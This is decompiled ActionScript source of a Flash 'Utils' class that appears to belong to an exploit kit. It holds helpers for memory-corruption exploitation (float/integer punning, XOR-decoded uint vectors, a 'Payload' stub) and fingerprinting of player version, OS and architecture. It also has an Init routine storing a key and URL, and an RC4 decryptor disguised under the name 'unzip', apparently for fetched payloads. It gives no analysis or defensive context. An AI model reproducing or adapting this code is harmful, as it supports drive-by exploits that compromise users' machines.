package
{
   import flash.utils.*;
   import flash.system.Capabilities;
   
   public class Utils
   {
      
      static var _key:String;
      
      static var _url:String;
      
      static var _uas:String;
      
      static var _dbg:Boolean = Capabilities.isDebugger;
      
      static var _sa:Boolean = Capabilities.playerType == "StandAlone";
      
      static var _win:Boolean = Capabilities.version.toUpperCase().search("WIN") >= 0;
      
      static var _osx:Boolean = Capabilities.version.toUpperCase().search("MAC") >= 0;
      
      static var _is64:Boolean;
      
      static var _vsn:uint;
      
      static var _ba1:ByteArray;
      
      static var _gc:Array;
      
      static var _done:Boolean;
      
      static var N32:Number = Math.pow(2,32);
       
      public function Utils()
      {
         super();
      }
      
      static function Payload(... rest) : *
      {
      }
      
      static function Throw(param1:String) : *
      {
         throw new Error(param1);
      }
      
      static function Hex(param1:uint) : String
      {
         if(param1 <= 9)
         {
            return param1.toString();
         }
         return "0x" + param1.toString(16);
      }
      
      static function Num(param1:uint, param2:uint) : Number
      {
         var _loc3_:Number = param1;
         if(_loc3_ != 0)
         {
            _loc3_ = _loc3_ * N32;
         }
         return _loc3_ + param2;
      }
      
      static function Hi(param1:Number) : uint
      {
         return uint(Math.floor(param1 / N32) & N32 - 1);
      }
      
      static function Low(param1:Number) : uint
      {
         return uint(param1 & N32 - 1);
      }
      
      static function u2f(param1:uint) : Number
      {
         _ba1.position = 0;
         _ba1.writeUnsignedInt(param1);
         _ba1.position = 0;
         return _ba1.readFloat();
      }
      
      static function f2u(param1:Number) : uint
      {
         _ba1.position = 0;
         _ba1.writeFloat(param1);
         _ba1.position = 0;
         return _ba1.readUnsignedInt();
      }
      
      static function XorVector(param1:Vector.<uint>) : *
      {
         var _loc4_:int = 0;
         var _loc2_:uint = param1.length;
         if(_loc2_ <= 1)
         {
            return;
         }
         var _loc3_:uint = param1[_loc2_ - 1];
         if(_loc3_)
         {
            _loc4_ = 0;
            while(_loc4_ < _loc2_ - 1)
            {
               param1[_loc4_] = param1[_loc4_] ^ _loc3_;
               _loc4_++;
               _loc3_ = _loc3_ + 16843009;
            }
            param1[_loc4_] = 0;
         }
      }
      
      static function CopyToVector(param1:Array, param2:Vector.<uint>, param3:uint) : *
      {
         var _loc5_:uint = 0;
         var _loc4_:uint = param1.length;
         if(_loc4_ > 1)
         {
            _loc5_ = 0;
            while(_loc5_ < _loc4_)
            {
               if(_loc5_ % 4 == 0)
               {
                  param2[param3 + (_loc5_ >>> 2)] = uint(param1[_loc5_]);
               }
               else
               {
                  param2[param3 + (_loc5_ >>> 2)] = param2[param3 + (_loc5_ >>> 2)] + (uint(param1[_loc5_]) << _loc5_ % 4 * 8);
               }
               _loc5_++;
            }
         }
         else if(_loc4_)
         {
            param2[param3] = param1[0];
         }
      }
      
      static function ToStringV(param1:Object, param2:uint = 0, param3:uint = 0) : String
      {
         var _loc5_:int = 0;
         if(!param1)
         {
            return "" + param1;
         }
         var _loc4_:* = "";
         if(!param3 || param3 + param2 > param1.length)
         {
            param3 = param1.length - param2;
         }
         param3 = param3 + param2;
         while(param2 < param3)
         {
            _loc4_ = _loc4_ + (Hex(param1[param2]) + ",");
            if(_loc4_.length - _loc5_ > 64)
            {
               _loc4_ = _loc4_ + "\n";
               _loc5_ = _loc4_.length;
            }
            param2++;
            _loc5_++;
         }
         return _loc4_;
      }
      
      static function ToStringF(param1:Array, param2:uint = 0, param3:uint = 0) : String
      {
         if(!param1)
         {
            return "" + param1;
         }
         var _loc4_:String = "";
         if(!param3 || param3 + param2 > param1.length)
         {
            param3 = param1.length - param2;
         }
         param3 = param3 + param2;
         while(param2 < param3)
         {
            _loc4_ = _loc4_ + (Hex(f2u(param1[param2])) + ",");
            param2++;
         }
         return _loc4_;
      }
      
      static function ToUintVector(param1:Array) : *
      {
         var _loc2_:uint = 0;
         var _loc4_:uint = 0;
         _loc2_ = param1.length;
         var _loc3_:Vector.<uint> = new Vector.<uint>((_loc2_ >>> 2) + (!!(_loc2_ % 4)?1:0));
         if(_loc2_ > 1)
         {
            _loc2_--;
            _loc4_ = 0;
            while(_loc4_ <= _loc2_)
            {
               _loc3_[_loc4_ >>> 2] = _loc3_[_loc4_ >>> 2] + (uint(param1[_loc4_]) << _loc4_ % 4 * 8);
               _loc4_++;
            }
         }
         else if(_loc2_)
         {
            _loc3_[0] = param1[0];
         }
         return _loc3_;
      }
      
      static function u2s(param1:uint, param2:int = 4) : String
      {
         var _loc3_:String = "";
         while(param2-- > 0)
         {
            _loc3_ = _loc3_ + String.fromCharCode(param1 & 255);
            param1 = param1 >>> 8;
         }
         return _loc3_;
      }
      
      static function ReadString(param1:Vector.<uint>, param2:uint, param3:int, param4:uint = 0) : String
      {
         var _loc5_:String = "";
         while(param4 > 4)
         {
            param4 = param4 - 4;
            param2++;
         }
         if(param4)
         {
            _loc5_ = u2s(param1[param2++] >>> param4 * 8,4 - param4);
            param3 = param3 - _loc5_.length;
         }
         while(param3 > 0)
         {
            _loc5_ = _loc5_ + u2s(param1[param2++],param3 > 4?4:int(param3));
            param3 = param3 - 4;
         }
         return _loc5_;
      }
      
      static function getVersion() : uint
      {
         var _loc1_:String = Capabilities.version.substr(4);
         return uint(_loc1_.substr(0,_loc1_.indexOf(",")));
      }
      
      static function is32(param1:String) : Boolean
      {
         var _loc2_:Boolean = Capabilities.supports64BitProcesses;
         if(Boolean(_loc2_) && Boolean(_win))
         {
            return param1.search("32") >= 0;
         }
         return !_loc2_;
      }
      
      static function is64(param1:String) : Boolean
      {
         var _loc2_:Boolean = Capabilities.supports64BitProcesses;
         if(Boolean(_loc2_) && Boolean(_win))
         {
            return param1.search("64") >= 0;
         }
         return _loc2_;
      }
      
      static function isChrome() : Boolean
      {
         return Capabilities.manufacturer.search("Pepper") >= 0;
      }
      
      public static function Init(param1:*, param2:*, param3:String) : *
      {
         try
         {
            _vsn = getVersion();
            if(!_gc)
            {
               _gc = new Array();
            }
            if(!_ba1)
            {
               _ba1 = new ByteArray();
            }
            _key = param1;
            _url = param2;
            _uas = param3;
            C32.Init();
            return;
         }
         catch(e:Error)
         {
            return;
         }
      }
      
      static function unzip(param1:String, param2:ByteArray) : ByteArray
      {
         var _loc6_:uint = 0;
         var _loc3_:ByteArray = new ByteArray();
         var _loc4_:uint = 0;
         var _loc5_:ByteArray = new ByteArray();
         var _loc7_:ByteArray = new ByteArray();
         _loc7_.writeMultiByte(param1,"iso-8859-1");
         var _loc8_:uint = 0;
         while(_loc8_ < 256)
         {
            _loc3_[_loc8_] = _loc8_;
            _loc8_++;
         }
         _loc8_ = 0;
         while(_loc8_ < 256)
         {
            _loc4_ = _loc4_ + _loc3_[_loc8_] + _loc7_[_loc8_ % _loc7_.length] & 255;
            _loc6_ = _loc3_[_loc8_];
            _loc3_[_loc8_] = _loc3_[_loc4_];
            _loc3_[_loc4_] = _loc6_;
            _loc8_++;
         }
         _loc8_ = 0;
         _loc4_ = 0;
         var _loc9_:uint = 0;
         while(_loc9_ < param2.length)
         {
            _loc8_ = _loc8_ + 1 & 255;
            _loc4_ = _loc4_ + _loc3_[_loc8_] & 255;
            _loc6_ = _loc3_[_loc8_];
            _loc3_[_loc8_] = _loc3_[_loc4_];
            _loc3_[_loc4_] = _loc6_;
            _loc5_[_loc9_] = param2[_loc9_] ^ _loc3_[_loc3_[_loc8_] + _loc3_[_loc4_] & 255];
            _loc9_++;
         }
         return _loc5_;
      }
   }
}
